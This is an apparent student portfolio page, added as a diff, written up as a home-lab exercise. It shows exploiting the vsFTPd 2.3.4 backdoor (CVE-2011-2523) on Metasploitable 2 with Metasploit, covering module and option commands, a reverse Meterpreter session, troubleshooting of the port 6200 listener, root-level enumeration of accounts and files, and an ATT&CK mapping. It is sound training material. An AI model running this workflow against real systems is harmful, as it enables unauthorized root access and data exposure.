@@ -1,0 +1,1248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Lab 05 - Metasploit Framework | Kypton Lantz</title>
+
+    <link rel="stylesheet" href="../../style.css">
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="../../index.html" class="logo">KL</a>
+
+            <div class="nav-links">
+                <a href="../../index.html">Home</a>
+                <a href="../../cybersecurity.html">Cybersecurity</a>
+                <a href="https://github.com/kalantz/" target="_blank" rel="noopener noreferrer">GitHub</a>
+            </div>
+        </div>
+    </nav>
+
+
+    <!-- Hero -->
+    <header class="hero">
+        <div class="hero-content">
+
+            <div class="lab-status">LAB 05 • COMPLETED</div>
+
+            <h1>Metasploit Framework</h1>
+
+            <p class="hero-subtitle">
+                Controlled exploitation and post-exploitation enumeration
+                of an intentionally vulnerable Linux system.
+            </p>
+
+            <p>
+                This lab connected the reconnaissance and vulnerability findings
+                from earlier labs to a hands-on exploitation workflow using
+                Metasploit. A known vsFTPd 2.3.4 vulnerability was validated,
+                exploited, and followed by controlled Meterpreter enumeration.
+            </p>
+
+        </div>
+    </header>
+
+
+    <main class="content-narrow">
+
+
+        <!-- Overview -->
+        <section class="content-section">
+
+            <h2>Overview</h2>
+
+            <p>
+                Lab 5 demonstrates the transition from vulnerability assessment
+                to controlled exploitation. Earlier labs identified
+                <strong>vsFTPd 2.3.4</strong> running on TCP port 21 and
+                associated the service with <strong>CVE-2011-2523</strong>.
+                Metasploit was then used to validate and exploit that finding
+                against the isolated Metasploitable 2 system.
+            </p>
+
+            <p>
+                After exploitation, the resulting Meterpreter session was
+                verified and used for controlled post-exploitation enumeration.
+                The investigation included account, filesystem, process,
+                operating-system, and network information before the session
+                was deliberately terminated.
+            </p>
+
+            <div class="lab-group">
+
+                <h3>Assessment Progression</h3>
+
+                <div class="result-grid">
+
+                    <div class="result-card">
+                        <h3>01 • Discovery</h3>
+                        <p>
+                            Earlier reconnaissance identified the exposed
+                            vsFTPd 2.3.4 service.
+                        </p>
+                    </div>
+
+                    <div class="result-card">
+                        <h3>02 • Vulnerability Identification</h3>
+                        <p>
+                            Nessus identified CVE-2011-2523 as a vulnerability
+                            associated with the service.
+                        </p>
+                    </div>
+
+                    <div class="result-card">
+                        <h3>03 • Exploitation</h3>
+                        <p>
+                            Metasploit's vsFTPd backdoor module was used to
+                            obtain a Meterpreter session.
+                        </p>
+                    </div>
+
+                    <div class="result-card">
+                        <h3>04 • Verification</h3>
+                        <p>
+                            The session was verified as root and the target
+                            system was independently identified.
+                        </p>
+                    </div>
+
+                    <div class="result-card">
+                        <h3>05 • Enumeration</h3>
+                        <p>
+                            Accounts, filesystem contents, processes, and
+                            network configuration were examined.
+                        </p>
+                    </div>
+
+                    <div class="result-card">
+                        <h3>06 • Cleanup</h3>
+                        <p>
+                            The Meterpreter session was terminated after
+                            testing was completed.
+                        </p>
+                    </div>
+
+                </div>
+
+            </div>
+
+        </section>
+
+
+        <!-- Objectives -->
+        <section class="content-section">
+
+            <h2>Objectives</h2>
+
+            <div class="result-grid">
+
+                <div class="result-card">
+                    <h3>Metasploit</h3>
+                    <p>
+                        Configure the Metasploit Framework and select an exploit
+                        matching an identified vulnerable service.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Vulnerability Validation</h3>
+                    <p>
+                        Use Metasploit's <code>check</code> functionality to
+                        validate the target before exploitation.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Exploitation</h3>
+                    <p>
+                        Perform a controlled exploitation attempt and establish
+                        a Meterpreter session.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Post-Exploitation</h3>
+                    <p>
+                        Verify privileges and enumerate system, account,
+                        filesystem, process, and network information.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Troubleshooting</h3>
+                    <p>
+                        Investigate an unsuccessful exploitation attempt using
+                        independent network testing.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Cleanup</h3>
+                    <p>
+                        Properly manage and terminate the active exploitation
+                        session after testing.
+                    </p>
+                </div>
+
+            </div>
+
+        </section>
+
+
+        <!-- Lab Environment -->
+        <section class="content-section">
+
+            <h2>Lab Environment</h2>
+
+            <div class="table-wrapper">
+
+                <table class="lab-table">
+
+                    <thead>
+                        <tr>
+                            <th>Component</th>
+                            <th>Configuration</th>
+                        </tr>
+                    </thead>
+
+                    <tbody>
+
+                        <tr>
+                            <td>Hypervisor</td>
+                            <td>Oracle VirtualBox</td>
+                        </tr>
+
+                        <tr>
+                            <td>Attacker</td>
+                            <td>KALI-ATTACK — 192.168.56.40</td>
+                        </tr>
+
+                        <tr>
+                            <td>Target</td>
+                            <td>METASPLOITABLE2 — 192.168.56.50</td>
+                        </tr>
+
+                        <tr>
+                            <td>Network</td>
+                            <td>192.168.56.0/24 Host-Only</td>
+                        </tr>
+
+                        <tr>
+                            <td>Framework</td>
+                            <td>Metasploit Framework</td>
+                        </tr>
+
+                        <tr>
+                            <td>Target Service</td>
+                            <td>vsFTPd 2.3.4 — TCP 21</td>
+                        </tr>
+
+                        <tr>
+                            <td>Vulnerability</td>
+                            <td>CVE-2011-2523</td>
+                        </tr>
+
+                        <tr>
+                            <td>Kali Version</td>
+                            <td>Kali GNU/Linux 2026.2</td>
+                        </tr>
+
+                    </tbody>
+
+                </table>
+
+            </div>
+
+            <p class="image-caption">
+                The assessment was conducted entirely inside the isolated
+                Host-Only cybersecurity lab. No production or external systems
+                were targeted.
+            </p>
+
+        </section>
+
+
+        <!-- Tools -->
+        <section class="content-section">
+
+            <h2>Tools Used</h2>
+
+            <div class="lab-grid">
+
+                <div class="lab-card">
+                    <h3>Metasploit Framework</h3>
+                    <p>Exploit selection, validation, execution, and session management.</p>
+                </div>
+
+                <div class="lab-card">
+                    <h3>Meterpreter</h3>
+                    <p>Session verification and controlled post-exploitation enumeration.</p>
+                </div>
+
+                <div class="lab-card">
+                    <h3>Nmap</h3>
+                    <p>Independent service and port validation during troubleshooting.</p>
+                </div>
+
+                <div class="lab-card">
+                    <h3>Netcat</h3>
+                    <p>Independent testing of the transient TCP 6200 listener.</p>
+                </div>
+
+                <div class="lab-card">
+                    <h3>Metasploitable 2</h3>
+                    <p>Intentionally vulnerable Linux target used for controlled testing.</p>
+                </div>
+
+                <div class="lab-card">
+                    <h3>VirtualBox</h3>
+                    <p>Isolated virtualization environment for the cybersecurity lab.</p>
+                </div>
+
+            </div>
+
+        </section>
+
+
+        <!-- Exploit Selection -->
+        <section class="content-section">
+
+            <h2>From Previous Findings to Exploitation</h2>
+
+            <p>
+                The exploit was not selected arbitrarily. Lab 2 identified
+                <strong>vsFTPd 2.3.4</strong> on TCP port 21, while Lab 4
+                identified <strong>CVE-2011-2523</strong> as an associated
+                vulnerability.
+            </p>
+
+            <p>
+                Metasploit was searched for a module corresponding to the
+                previously identified service and vulnerability.
+            </p>
+
+            <div class="code-block">
+                exploit/unix/ftp/vsftpd_234_backdoor
+            </div>
+
+            <p>
+                The module information identified the exploit as
+                <strong>VSFTPD 2.3.4 Backdoor Command Execution</strong>
+                and associated it with CVE-2011-2523.
+            </p>
+
+            <div class="evidence-grid">
+
+                <figure class="evidence-card">
+                    <img
+                        src="screenshots/msf-vsftpd-info1.png"
+                        alt="Metasploit information for the VSFTPD 2.3.4 backdoor exploit"
+                        class="lab-image"
+                    >
+                    <figcaption class="image-caption">
+                        Metasploit module information identifying the
+                        VSFTPd 2.3.4 backdoor exploit.
+                    </figcaption>
+                </figure>
+
+            </div>
+
+        </section>
+
+
+        <!-- Configuration -->
+        <section class="content-section">
+
+            <h2>Exploit Configuration</h2>
+
+            <p>
+                The selected module was configured for the isolated target and
+                Kali callback address.
+            </p>
+
+            <div class="code-block">
+                show options<br>
+                set RHOSTS 192.168.56.50<br>
+                set LHOST 192.168.56.40
+            </div>
+
+            <div class="result-grid">
+
+                <div class="result-card">
+                    <h3>RHOSTS</h3>
+                    <p>
+                        Identifies the remote target:
+                        <strong>192.168.56.50</strong>.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>RPORT</h3>
+                    <p>
+                        The vulnerable FTP service was listening on
+                        <strong>TCP 21</strong>.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>LHOST</h3>
+                    <p>
+                        Identifies Kali's isolated Host-Only address:
+                        <strong>192.168.56.40</strong>.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Payload</h3>
+                    <p>
+                        The configured payload established a reverse TCP
+                        Meterpreter session.
+                    </p>
+                </div>
+
+            </div>
+
+            <div class="evidence-grid">
+
+                <figure class="evidence-card">
+                    <img
+                        src="screenshots/msf-vsftpd-show-options-updated1.png"
+                        alt="Final Metasploit exploit configuration"
+                        class="lab-image"
+                    >
+                    <figcaption class="image-caption">
+                        Final Metasploit configuration showing the target,
+                        callback address, FTP port, and payload.
+                    </figcaption>
+                </figure>
+
+            </div>
+
+        </section>
+
+
+        <!-- Vulnerability Check -->
+        <section class="content-section">
+
+            <h2>Pre-Exploitation Validation</h2>
+
+            <p>
+                Before attempting exploitation, Metasploit's built-in
+                <code>check</code> functionality was used to validate the
+                target.
+            </p>
+
+            <div class="code-block">
+                check
+            </div>
+
+            <p>
+                Metasploit detected the expected vsFTPd 2.3.4 banner and
+                reported that the target appeared vulnerable.
+            </p>
+
+            <div class="result-grid">
+
+                <div class="result-card">
+                    <h3>Service</h3>
+                    <p>vsFTPd 2.3.4 on TCP 21.</p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Validation</h3>
+                    <p>Metasploit identified the expected vulnerable banner.</p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Exploitation Status</h3>
+                    <p>
+                        Validation occurred before the exploitation attempt.
+                    </p>
+                </div>
+
+            </div>
+
+            <div class="evidence-grid">
+
+                <figure class="evidence-card">
+                    <img
+                        src="screenshots/msf-vsftpd-check.png"
+                        alt="Metasploit vulnerability check for VSFTPD 2.3.4"
+                        class="lab-image"
+                    >
+                    <figcaption class="image-caption">
+                        Metasploit identifying the vulnerable vsFTPd 2.3.4
+                        banner before exploitation.
+                    </figcaption>
+                </figure>
+
+            </div>
+
+        </section>
+
+
+        <!-- Troubleshooting -->
+        <section class="content-section">
+
+            <h2>Troubleshooting the Initial Exploitation Failure</h2>
+
+            <p>
+                The first exploitation attempt did not immediately create a
+                session. Metasploit reported that it could not connect to the
+                temporary backdoor listener on TCP port 6200.
+            </p>
+
+            <div class="code-block">
+                Unable to connect to backdoor on 6200/TCP. Cooldown?<br>
+                Exploit completed, but no session was created.
+            </div>
+
+            <p>
+                Rather than treating the failed attempt as evidence that the
+                vulnerability was absent, the temporary listener was
+                investigated independently from a second Kali terminal.
+            </p>
+
+            <h3>Netcat Test</h3>
+
+            <div class="code-block">
+                nc -nvz 192.168.56.50 6200
+            </div>
+
+            <p>
+                Netcat observed TCP 6200 as open at that particular moment.
+                A subsequent Nmap scan reported the same port as closed.
+            </p>
+
+            <div class="code-block">
+                nmap -sV -p 6200 192.168.56.50
+            </div>
+
+            <p>
+                The difference between the two observations demonstrated that
+                the backdoor listener was transient. This explained the
+                timing-sensitive behavior reported by Metasploit.
+            </p>
+
+            <div class="evidence-grid">
+
+                <figure class="evidence-card">
+                    <img
+                        src="screenshots/msf-vsftpd-exploit-failure.png"
+                        alt="Initial failed Metasploit exploitation attempt"
+                        class="lab-image"
+                    >
+                    <figcaption class="image-caption">
+                        Initial exploitation attempt showing the vulnerable
+                        service but failure to connect to TCP 6200.
+                    </figcaption>
+                </figure>
+
+                <figure class="evidence-card">
+                    <img
+                        src="screenshots/kali-msfconsole-troubleshoot.png"
+                        alt="Troubleshooting the transient TCP 6200 listener"
+                        class="lab-image"
+                    >
+                    <figcaption class="image-caption">
+                        Independent troubleshooting of the transient TCP 6200
+                        backdoor listener.
+                    </figcaption>
+                </figure>
+
+            </div>
+
+            <div class="lab-group">
+
+                <h3>Key Troubleshooting Lesson</h3>
+
+                <p>
+                    A failed exploit attempt does not necessarily mean that a
+                    vulnerability is absent. Service state, listener timing,
+                    payload behavior, and environmental conditions can all
+                    affect exploitation. Independent network testing helped
+                    distinguish a vulnerable target from a transient
+                    exploitation failure.
+                </p>
+
+            </div>
+
+        </section>
+
+
+        <!-- Successful Exploitation -->
+        <section class="content-section">
+
+            <h2>Successful Exploitation</h2>
+
+            <p>
+                After the transient backdoor condition cleared, the exploit was
+                executed again. The second attempt successfully created a
+                Meterpreter session.
+            </p>
+
+            <div class="code-block">
+                exploit
+            </div>
+
+            <p>
+                The successful workflow demonstrated the complete exploitation
+                path:
+            </p>
+
+            <div class="result-grid">
+
+                <div class="result-card">
+                    <h3>01</h3>
+                    <p>Metasploit connected to the vulnerable FTP service.</p>
+                </div>
+
+                <div class="result-card">
+                    <h3>02</h3>
+                    <p>The vsFTPd backdoor was triggered.</p>
+                </div>
+
+                <div class="result-card">
+                    <h3>03</h3>
+                    <p>The temporary backdoor was spawned.</p>
+                </div>
+
+                <div class="result-card">
+                    <h3>04</h3>
+                    <p>The configured payload established a callback.</p>
+                </div>
+
+                <div class="result-card">
+                    <h3>05</h3>
+                    <p>A Meterpreter session was created.</p>
+                </div>
+
+            </div>
+
+            <div class="evidence-grid">
+
+                <figure class="evidence-card">
+                    <img
+                        src="screenshots/msf-vsftpd-exploit-success.png"
+                        alt="Successful Metasploit exploitation and Meterpreter session creation"
+                        class="lab-image"
+                    >
+                    <figcaption class="image-caption">
+                        Successful exploitation showing the spawned backdoor
+                        and creation of Meterpreter session 1.
+                    </figcaption>
+                </figure>
+
+            </div>
+
+        </section>
+
+
+        <!-- Meterpreter Verification -->
+        <section class="content-section">
+
+            <h2>Meterpreter Session Verification</h2>
+
+            <p>
+                Successful session creation was not treated as sufficient by
+                itself. The resulting access was independently verified using
+                multiple Meterpreter commands.
+            </p>
+
+            <div class="result-grid">
+
+                <div class="result-card">
+                    <h3><code>getuid</code></h3>
+                    <p>
+                        Returned <strong>root</strong>, confirming the privilege
+                        level of the compromised session.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3><code>sysinfo</code></h3>
+                    <p>
+                        Identified the target as Ubuntu 8.04 running on an
+                        i686 architecture.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3><code>ipconfig</code></h3>
+                    <p>
+                        Confirmed the target's expected
+                        <strong>192.168.56.50</strong> network address.
+                    </p>
+                </div>
+
+            </div>
+
+            <div class="evidence-grid">
+
+                <figure class="evidence-card">
+                    <img
+                        src="screenshots/meterpreter-getuid.png"
+                        alt="Meterpreter getuid output confirming root access"
+                        class="lab-image"
+                    >
+                    <figcaption class="image-caption">
+                        Meterpreter <code>getuid</code> confirming that the
+                        session was operating as root.
+                    </figcaption>
+                </figure>
+
+                <figure class="evidence-card">
+                    <img
+                        src="screenshots/meterpreter-sysinfo.png"
+                        alt="Meterpreter sysinfo output identifying the target system"
+                        class="lab-image"
+                    >
+                    <figcaption class="image-caption">
+                        <code>sysinfo</code> confirming the expected Metasploitable
+                        2 operating system and architecture.
+                    </figcaption>
+                </figure>
+
+            </div>
+
+        </section>
+
+
+        <!-- Post Exploitation -->
+        <section class="content-section">
+
+            <h2>Controlled Post-Exploitation Enumeration</h2>
+
+            <p>
+                After access was established, limited enumeration was performed
+                to demonstrate the visibility available from the compromised
+                root session.
+            </p>
+
+            <div class="result-grid">
+
+                <div class="result-card">
+                    <h3>Account Discovery</h3>
+                    <p>
+                        <code>/etc/passwd</code> was examined to identify local
+                        accounts and service users.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Filesystem Discovery</h3>
+                    <p>
+                        The <code>/root</code> directory was examined for
+                        privileged filesystem contents and configuration.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Process Discovery</h3>
+                    <p>
+                        Running processes and services were enumerated using
+                        Meterpreter's process functionality.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Network Discovery</h3>
+                    <p>
+                        The target's network configuration and routing
+                        information were examined.
+                    </p>
+                </div>
+
+            </div>
+
+            <h3>Process Correlation</h3>
+
+            <p>
+                Process enumeration revealed a randomized executable named
+                <strong>kJvpXmKUmBQ</strong> running as root with PID
+                <strong>4953</strong>. Meterpreter's <code>getpid</code>
+                independently returned PID 4953, providing an additional
+                correlation between the active Meterpreter process and the
+                payload running on the target.
+            </p>
+
+            <div class="evidence-grid">
+
+                <figure class="evidence-card">
+                    <img
+                        src="screenshots/meterpreter-process-enum.png"
+                        alt="Meterpreter process enumeration showing the running payload process"
+                        class="lab-image"
+                    >
+                    <figcaption class="image-caption">
+                        Process enumeration showing running services and the
+                        randomized payload process.
+                    </figcaption>
+                </figure>
+
+            </div>
+
+        </section>
+
+
+        <!-- Native Shell -->
+        <section class="content-section">
+
+            <h2>Native Linux Shell</h2>
+
+            <p>
+                Meterpreter was also used to establish a native Linux shell.
+                The target's routing table was then examined directly from
+                the underlying operating system.
+            </p>
+
+            <div class="code-block">
+                shell<br><br>
+                ip route<br><br>
+                exit
+            </div>
+
+            <p>
+                The routing information confirmed that the native shell was
+                executing directly within the Metasploitable 2 Linux
+                environment. The shell was then closed to return to the
+                Meterpreter session.
+            </p>
+
+        </section>
+
+
+        <!-- Cleanup -->
+        <section class="content-section">
+
+            <h2>Session Management &amp; Cleanup</h2>
+
+            <p>
+                After enumeration was complete, the Meterpreter session was
+                deliberately backgrounded and reviewed before being terminated.
+            </p>
+
+            <div class="code-block">
+                background<br>
+                sessions<br>
+                sessions -k 1
+            </div>
+
+            <p>
+                The final session check reported no active sessions. This
+                completed the exploitation workflow without leaving an active
+                Meterpreter connection running.
+            </p>
+
+            <div class="evidence-grid">
+
+                <figure class="evidence-card">
+                    <img
+                        src="screenshots/meterpreter-active-session.png"
+                        alt="Metasploit active Meterpreter session listing"
+                        class="lab-image"
+                    >
+                    <figcaption class="image-caption">
+                        Active session listing showing the root Meterpreter
+                        session and Kali-to-target connection.
+                    </figcaption>
+                </figure>
+
+            </div>
+
+        </section>
+
+
+        <!-- Results -->
+        <section class="content-section">
+
+            <h2>Exploitation Results</h2>
+
+            <div class="table-wrapper">
+
+                <table class="lab-table">
+
+                    <thead>
+                        <tr>
+                            <th>Stage</th>
+                            <th>Result</th>
+                        </tr>
+                    </thead>
+
+                    <tbody>
+
+                        <tr>
+                            <td>Service Identified</td>
+                            <td>vsFTPd 2.3.4 on TCP 21</td>
+                        </tr>
+
+                        <tr>
+                            <td>Vulnerability</td>
+                            <td>CVE-2011-2523</td>
+                        </tr>
+
+                        <tr>
+                            <td>Metasploit Module</td>
+                            <td><code>exploit/unix/ftp/vsftpd_234_backdoor</code></td>
+                        </tr>
+
+                        <tr>
+                            <td>Vulnerability Check</td>
+                            <td>Target reported vulnerable</td>
+                        </tr>
+
+                        <tr>
+                            <td>First Exploit Attempt</td>
+                            <td>Failed due to transient TCP 6200 listener behavior</td>
+                        </tr>
+
+                        <tr>
+                            <td>Troubleshooting</td>
+                            <td>TCP 6200 observed open, then closed</td>
+                        </tr>
+
+                        <tr>
+                            <td>Second Exploit Attempt</td>
+                            <td>Successful</td>
+                        </tr>
+
+                        <tr>
+                            <td>Session Type</td>
+                            <td>Meterpreter x86/Linux</td>
+                        </tr>
+
+                        <tr>
+                            <td>Privilege</td>
+                            <td>root</td>
+                        </tr>
+
+                        <tr>
+                            <td>Target OS</td>
+                            <td>Ubuntu 8.04</td>
+                        </tr>
+
+                        <tr>
+                            <td>Native Shell</td>
+                            <td>Successfully established</td>
+                        </tr>
+
+                        <tr>
+                            <td>Session Cleanup</td>
+                            <td>Completed</td>
+                        </tr>
+
+                    </tbody>
+
+                </table>
+
+            </div>
+
+        </section>
+
+
+        <!-- Key Takeaways -->
+        <section class="content-section">
+
+            <h2>Key Takeaways</h2>
+
+            <div class="result-grid">
+
+                <div class="result-card">
+                    <h3>Connect the Evidence</h3>
+                    <p>
+                        Earlier reconnaissance and vulnerability findings
+                        directly informed exploit selection.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Validate Before Exploiting</h3>
+                    <p>
+                        Metasploit's <code>check</code> function provided a
+                        pre-exploitation validation step.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Troubleshoot the Failure</h3>
+                    <p>
+                        Netcat and Nmap helped explain why the first exploitation
+                        attempt did not produce a session.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Verify Access</h3>
+                    <p>
+                        The Meterpreter session was independently verified as
+                        root and associated with the expected target.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Limit Post-Exploitation</h3>
+                    <p>
+                        Enumeration remained controlled and focused on
+                        demonstrating access and system visibility.
+                    </p>
+                </div>
+
+                <div class="result-card">
+                    <h3>Clean Up</h3>
+                    <p>
+                        The active Meterpreter session was explicitly terminated
+                        after testing.
+                    </p>
+                </div>
+
+            </div>
+
+        </section>
+
+
+        <!-- MITRE ATT&CK -->
+        <section class="content-section">
+
+            <h2>MITRE ATT&amp;CK Mapping</h2>
+
+            <div class="table-wrapper">
+
+                <table class="lab-table">
+
+                    <thead>
+                        <tr>
+                            <th>Tactic</th>
+                            <th>Technique</th>
+                            <th>Lab Relevance</th>
+                        </tr>
+                    </thead>
+
+                    <tbody>
+
+                        <tr>
+                            <td>Discovery</td>
+                            <td>Network Service Discovery — T1046</td>
+                            <td>
+                                Previous reconnaissance identified the exposed
+                                vsFTPd service used to select the exploit.
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>Initial Access</td>
+                            <td>Exploit Public-Facing Application — T1190</td>
+                            <td>
+                                The remotely accessible vulnerable FTP service
+                                was exploited within the isolated lab.
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>Execution</td>
+                            <td>Command and Scripting Interpreter — T1059</td>
+                            <td>
+                                Commands were executed through the compromised
+                                Meterpreter session.
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>Execution</td>
+                            <td>Unix Shell — T1059.004</td>
+                            <td>
+                                A native Linux shell was established through
+                                Meterpreter.
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>Execution / Transfer</td>
+                            <td>Ingress Tool Transfer — T1105</td>
+                            <td>
+                                The configured payload was transferred to the
+                                target as part of the exploitation workflow.
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>Discovery</td>
+                            <td>Account Discovery: Local Account — T1087.001</td>
+                            <td>
+                                <code>/etc/passwd</code> was enumerated to
+                                identify local accounts.
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>Discovery</td>
+                            <td>File and Directory Discovery — T1083</td>
+                            <td>
+                                The root user's home directory and filesystem
+                                contents were enumerated.
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>Discovery</td>
+                            <td>Process Discovery — T1057</td>
+                            <td>
+                                Running processes were enumerated and correlated
+                                with the Meterpreter payload.
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>Discovery</td>
+                            <td>System Network Configuration Discovery — T1016</td>
+                            <td>
+                                Target network configuration and routing were
+                                examined.
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>Discovery</td>
+                            <td>System Information Discovery — T1082</td>
+                            <td>
+                                <code>sysinfo</code> identified the target OS
+                                and architecture.
+                            </td>
+                        </tr>
+
+                    </tbody>
+
+                </table>
+
+            </div>
+
+            <p class="image-caption">
+                These mappings describe how the observed lab activity
+                corresponds to MITRE ATT&amp;CK techniques. The assessment
+                remained confined to the intentionally vulnerable training
+                environment.
+            </p>
+
+        </section>
+
+
+        <!-- Full Documentation -->
+        <section class="content-section">
+
+            <h2>Technical Documentation</h2>
+
+            <p>
+                The GitHub documentation contains the complete technical
+                walkthrough, command explanations, detailed troubleshooting,
+                full validation results, and the complete evidence set.
+            </p>
+
+            <a
+                href="https://github.com/kalantz/05-Metasploit-Framework"
+                class="btn"
+                target="_blank"
+                rel="noopener noreferrer"
+            >
+                View Full Lab Documentation on GitHub
+            </a>
+
+        </section>
+
+
+        <!-- Navigation -->
+        <section class="content-section">
+
+            <div class="result-grid">
+
+                <div class="result-card">
+                    <h3>← Previous Lab</h3>
+                    <p>
+                        Vulnerability Scanning with Nessus
+                    </p>
+
+                    <a
+                        href="../lab-04-nessus/index.html"
+                        class="btn"
+                    >
+                        Lab 04
+                    </a>
+                </div>
+
+                <div class="result-card">
+                    <h3>Next Lab →</h3>
+                    <p>
+                        Password Attacks
+                    </p>
+
+                    <a
+                        href="../lab-06-password-attacks/index.html"
+                        class="btn"
+                    >
+                        Lab 06
+                    </a>
+                </div>
+
+            </div>
+
+        </section>
+
+    </main>
+
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p>
+            © 2026 Kypton Lantz • Cybersecurity Home Lab
+        </p>
+    </footer>
+
+
+    <!-- Evidence Image Sizing -->
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+
+            const evidenceImages =
+                document.querySelectorAll(".evidence-card img");
+
+            evidenceImages.forEach((img) => {
+
+                const classifyImage = () => {
+
+                    const aspectRatio =
+                        img.naturalWidth / img.naturalHeight;
+
+                    if (aspectRatio >= 1.5) {
+
+                        const card =
+                            img.closest(".evidence-card");
+
+                        if (card) {
+                            card.classList.add("wide");
+                        }
+
+                    }
+
+                };
+
+                if (img.complete && img.naturalWidth > 0) {
+                    classifyImage();
+                } else {
+                    img.addEventListener(
+                        "load",
+                        classifyImage,
+                        { once: true }
+                    );
+                }
+
+            });
+
+        });
+    </script>
+
+</body>
+</html>
